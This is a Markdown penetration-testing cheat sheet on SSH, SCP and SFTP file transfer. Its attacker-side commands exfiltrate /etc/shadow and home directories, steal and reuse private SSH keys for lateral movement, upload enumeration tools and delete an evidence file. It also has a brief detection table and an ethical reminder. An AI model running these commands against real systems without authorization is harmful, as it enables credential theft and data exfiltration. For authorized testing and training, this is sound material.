# 🔒 SSH / SCP / SFTP File Transfer — Encrypted Transfers

## 📖 What Is SSH-Based File Transfer?

SSH-based file transfer uses the **SSH (Secure Shell) protocol** to transfer files securely. All data is **encrypted** — unlike HTTP, FTP, or Netcat.

> SSH file transfer is the **most secure** method available. If the target has SSH access (port 22), this should be your preferred transfer method.

```text
  ATTACKER                                    TARGET
  ┌──────────────┐    SSH (Port 22)          ┌──────────────┐
  │              │ ──────────────────────── ▶│              │
  │  SCP/SFTP    │    🔐 Encrypted           │  SSH Server  │
  │  Client      │    File Transfer          │  (sshd)      │
  │              │ ◀────────────────────────│              │
  └──────────────┘    Both directions        └──────────────┘
```

### Three SSH Transfer Tools

| Tool | Purpose | Interactive | Best For |
| --- | --- | --- | --- |
| **SCP** | Simple file copy | ❌ Non-interactive | Quick one-off transfers |
| **SFTP** | Full file management | ✅ Interactive | Browsing + managing files |
| **SSH + tricks** | Piping data over SSH | ❌ Non-interactive | Creative transfers |

---

# 📋 SCP — Secure Copy

SCP is the simplest way to copy files over SSH.

---

## Upload TO Target (Attacker → Target)

```bash
# Upload single file
scp linpeas.sh user@10.0.0.5:/tmp/linpeas.sh

# Upload with specific SSH key
scp -i id_rsa linpeas.sh user@10.0.0.5:/tmp/

# Upload entire directory
scp -r tools/ user@10.0.0.5:/tmp/tools/

# Upload to specific port (non-standard SSH port)
scp -P 2222 tool.sh user@10.0.0.5:/tmp/

# Upload multiple files
scp file1.sh file2.exe file3.py user@10.0.0.5:/tmp/
```

### Diagram

```text
  ATTACKER                        TARGET
  ┌──────────┐                   ┌──────────┐
  │          │   scp file →      │          │
  │ linpeas  │ ────────────────▶ │ /tmp/    │
  │ .sh      │   Port 22 (SSH)   │ linpeas  │
  │          │   Encrypted ✅     │ .sh      │
  └──────────┘                   └──────────┘
```

---

## Download FROM Target (Target → Attacker)

```bash
# Download single file
scp user@10.0.0.5:/etc/shadow /tmp/shadow

# Download entire directory
scp -r user@10.0.0.5:/var/www/html/ ./website_backup/

# Download with SSH key
scp -i id_rsa user@10.0.0.5:/home/user/.ssh/id_rsa ./stolen_key

# Download multiple files with wildcard
scp user@10.0.0.5:/tmp/*.txt ./loot/
```

---

## SCP Between Two Remote Hosts

```bash
# Copy from Server A to Server B (through your machine)
scp user@SERVER_A:/data/file.db user@SERVER_B:/backup/file.db
```

---

# 📂 SFTP — SSH File Transfer Protocol

SFTP gives you an **interactive file browser** over SSH — like an FTP client but encrypted.

---

## Connect to SFTP

```bash
# Basic connection
sftp user@10.0.0.5

# With SSH key
sftp -i id_rsa user@10.0.0.5

# Specific port
sftp -P 2222 user@10.0.0.5
```

---

## SFTP Commands (Interactive)

Once connected, you're in an interactive shell:

```bash
sftp> help              # Show all commands

# Navigate remote system
sftp> pwd               # Print remote directory
sftp> ls                # List remote files
sftp> cd /etc           # Change remote directory

# Navigate local system (your attacker)
sftp> lpwd              # Print local directory
sftp> lls               # List local files
sftp> lcd /tmp          # Change local directory

# Download files (remote → local)
sftp> get /etc/shadow          # Download single file
sftp> get -r /var/www/html/    # Download directory
sftp> mget *.conf              # Download multiple files

# Upload files (local → remote)
sftp> put linpeas.sh /tmp/     # Upload single file
sftp> put -r tools/ /tmp/      # Upload directory
sftp> mput *.sh /tmp/          # Upload multiple files

# Other operations
sftp> mkdir /tmp/loot          # Create directory
sftp> rm /tmp/evidence.txt     # Delete file
sftp> chmod 755 /tmp/tool.sh   # Change permissions

# Exit
sftp> exit
sftp> bye
sftp> quit
```

---

## SFTP One-Liner (Non-Interactive)

```bash
# Download file non-interactively
sftp user@10.0.0.5:/etc/shadow /tmp/shadow

# Upload file non-interactively
echo "put linpeas.sh /tmp/" | sftp user@10.0.0.5

# Batch mode with commands file
sftp -b commands.txt user@10.0.0.5
```

---

# 🧠 SSH Tricks for File Transfer

---

## SSH + tar (Transfer Entire Directories)

```bash
# Download directory — compress on fly
ssh user@10.0.0.5 "tar czf - /home" > home_backup.tar.gz

# Upload directory — decompress on target
tar czf - tools/ | ssh user@10.0.0.5 "cd /tmp && tar xzf -"
```

```text
  ATTACKER                                 TARGET
  ┌────────────┐   SSH tunnel              ┌────────────┐
  │            │ ◀──────────────────────── │            │
  │ Receives   │    tar archive stream     │ Compresses │
  │ .tar.gz    │    encrypted via SSH      │ /home dir  │
  └────────────┘                           └────────────┘
```

---

## SSH + cat (Transfer Single Files)

```bash
# Download file via SSH pipe
ssh user@10.0.0.5 "cat /etc/shadow" > shadow.txt

# Upload file via SSH pipe
cat linpeas.sh | ssh user@10.0.0.5 "cat > /tmp/linpeas.sh"
```

---

## SSH + dd (Transfer Disk Images / Large Files)

```bash
# Download disk image
ssh user@10.0.0.5 "dd if=/dev/sda bs=4M" | dd of=disk_image.img bs=4M

# Download with progress
ssh user@10.0.0.5 "dd if=/dev/sda bs=4M" | pv | dd of=disk.img bs=4M
```

---

## SSH Port Forwarding for File Transfer

If direct file transfer is blocked but SSH works:

```bash
# Forward local port 8080 to target's internal web server
ssh -L 8080:internal-server:80 user@10.0.0.5

# Now download from internal server via localhost
wget http://localhost:8080/secret.pdf
```

---

# 🔑 Using SSH Keys (Instead of Passwords)

---

## Generate SSH Key Pair

```bash
ssh-keygen -t rsa -b 4096 -f my_key
# Creates: my_key (private) and my_key.pub (public)
```

## Use Key for SCP/SFTP

```bash
scp -i my_key file.txt user@10.0.0.5:/tmp/
sftp -i my_key user@10.0.0.5
```

## Found a Private Key on Target?

```bash
# Download the key
scp user@10.0.0.5:/home/admin/.ssh/id_rsa ./stolen_key

# Fix permissions
chmod 600 stolen_key

# Use it to access other machines
ssh -i stolen_key admin@other-server

# Transfer files to other machines with stolen key
scp -i stolen_key tool.exe admin@other-server:/tmp/
```

---

## 🔥 Realistic Scenarios

---

### Scenario 1: Upload Enumeration Tools via SCP

```text
SITUATION: You cracked a user's SSH password

ATTACKER:
┌──────────────────────────────────────────────────────┐
│ # Upload LinPEAS                                     │
│ scp linpeas.sh user@10.0.0.5:/tmp/                  │
│                                                      │
│ # SSH in and run it                                  │
│ ssh user@10.0.0.5                                    │
│ chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh         │
└──────────────────────────────────────────────────────┘
```

---

### Scenario 2: Exfiltrate Home Directories

```text
ATTACKER:
┌──────────────────────────────────────────────────────┐
│ # Download all home directories as tar archive       │
│ ssh root@10.0.0.5 "tar czf - /home" > homes.tar.gz │
│                                                      │
│ # Extract and investigate                            │
│ tar xzf homes.tar.gz                                │
│ ls home/                                             │
│ find home/ -name "*.key" -o -name "*.pem"           │
└──────────────────────────────────────────────────────┘
```

---

### Scenario 3: Lateral Movement — Key Found, Access New Machine

```text
STEP 1: Found SSH key on compromised machine
┌──────────────────────────────────────────────────────┐
│ cat /home/dbadmin/.ssh/id_rsa                        │
│ # Copy key to attacker machine                       │
└──────────────────────────────────────────────────────┘

STEP 2: Use key to access database server
┌──────────────────────────────────────────────────────┐
│ chmod 600 stolen_key                                 │
│ ssh -i stolen_key dbadmin@10.0.0.20                  │
│ # Now on database server!                            │
│                                                      │
│ # Upload tools                                       │
│ scp -i stolen_key pspy64 dbadmin@10.0.0.20:/tmp/    │
└──────────────────────────────────────────────────────┘
```

---

## 📊 SCP vs SFTP vs SSH Tricks

| Feature | SCP | SFTP | SSH+tar/cat |
| --- | --- | --- | --- |
| Interactive | ❌ | ✅ | ❌ |
| Browse remote files | ❌ | ✅ | ❌ |
| Resume transfers | ❌ | ✅ | ❌ |
| Transfer directories | ✅ (`-r` flag) | ✅ | ✅ |
| Simplicity | ⭐ Very easy | ⭐⭐ Easy | ⭐⭐⭐ Medium |
| Speed | Fast | Medium | Fast |
| Encrypted | ✅ | ✅ | ✅ |

---

## 📊 Quick Reference

| Action | Command |
| --- | --- |
| Upload file | `scp file user@IP:/path/` |
| Download file | `scp user@IP:/path/file ./` |
| Upload directory | `scp -r dir/ user@IP:/path/` |
| Download directory | `scp -r user@IP:/path/ ./` |
| SFTP connect | `sftp user@IP` |
| SFTP download | `sftp> get /path/file` |
| SFTP upload | `sftp> put file /path/` |
| SSH tar download | `ssh user@IP "tar czf - /dir" > backup.tar.gz` |
| SSH cat download | `ssh user@IP "cat /file" > local_copy` |

---

## 🛡 Blue Team — Detection

| Indicator | What to Monitor |
| --- | --- |
| SSH logins | Event logs for SSH authentication |
| SCP/SFTP data volume | Large data transfers over port 22 |
| SSH key authentication | New/unknown keys in authorized_keys |
| SSH from unusual sources | Connections from non-standard clients |

---

## ⚠ Ethical Reminder

* ✅ Only use on systems with **written authorization**
* ✅ Practice in your own lab
* ❌ Never exfiltrate real data without permission
